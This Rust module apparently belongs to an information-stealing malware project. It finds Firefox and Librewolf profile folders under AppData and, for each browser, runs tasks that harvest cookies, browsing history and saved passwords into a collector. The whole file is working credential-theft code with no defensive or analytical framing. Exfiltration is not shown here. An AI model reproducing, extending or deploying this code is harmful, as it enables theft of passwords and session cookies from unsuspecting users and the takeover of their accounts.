mod cookies;
mod history;
mod passwords;

use crate::gecko::cookies::CookiesTask;
use crate::gecko::history::HistoryTask;
use crate::gecko::passwords::PasswordTask;
use crate::vec;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use core::ops::Deref;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use tasks::{CompositeTask, Task, composite_task};

pub(crate) struct GeckoTask<'a, C: Collector, F: FileSystem> {
    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, C, F> {
    fn default() -> Self {
        let all_browsers = get_gecko_browsers();
        let mut tasks = Vec::new();

        for base_browser in all_browsers {
            let Some(browser) = get_browser_data(&StorageFileSystem, base_browser) else {
                continue;
            };

            let browser = Arc::new(browser);

            tasks.push((
                browser.clone(),
                composite_task!(
                    CookiesTask::new(browser.clone()),
                    HistoryTask::new(browser.clone()),
                    PasswordTask::new(browser.clone()),
                ),
            ))
        }

        Self { tasks }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for GeckoTask<'_, C, F> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        for (browser, task) in &self.tasks {
            let parent = parent / browser.name;
            task.run(&parent, filesystem, collector);
        }
    }
}

fn get_browser_data<'a, F: FileSystem>(
    fs: &F,
    browser: GeckoBrowser<'a>,
) -> Option<GeckoBrowserData<'a>> {
    if !fs.is_exists(&browser.base) {
        return None;
    }

    let profiles = fs.list_files_filtered(&browser.base / "Profiles", &|f| fs.is_dir(f))?;

    if profiles.is_empty() {
        None
    } else {
        Some(GeckoBrowserData {
            inner: browser,
            profiles,
        })
    }
}

struct GeckoBrowserData<'a> {
    inner: GeckoBrowser<'a>,
    profiles: Vec<Path>,
}

impl<'a> Deref for GeckoBrowserData<'a> {
    type Target = GeckoBrowser<'a>;

    fn deref(&self) -> &Self::Target {
        &self.inner
    }
}

struct GeckoBrowser<'a> {
    name: &'a str,
    base: Path,
}

macro_rules! browser {
    ($name:expr, $path:expr) => {
        GeckoBrowser {
            name: $name,
            base: $path,
        }
    };
}

fn get_gecko_browsers<'a>() -> [GeckoBrowser<'a>; 2] {
    let appdata = Path::appdata();

    [
        browser!("Firefox", &appdata / "Mozilla" / "Firefox"),
        browser!("Librewolf", &appdata / "librewolf"),
    ]
}
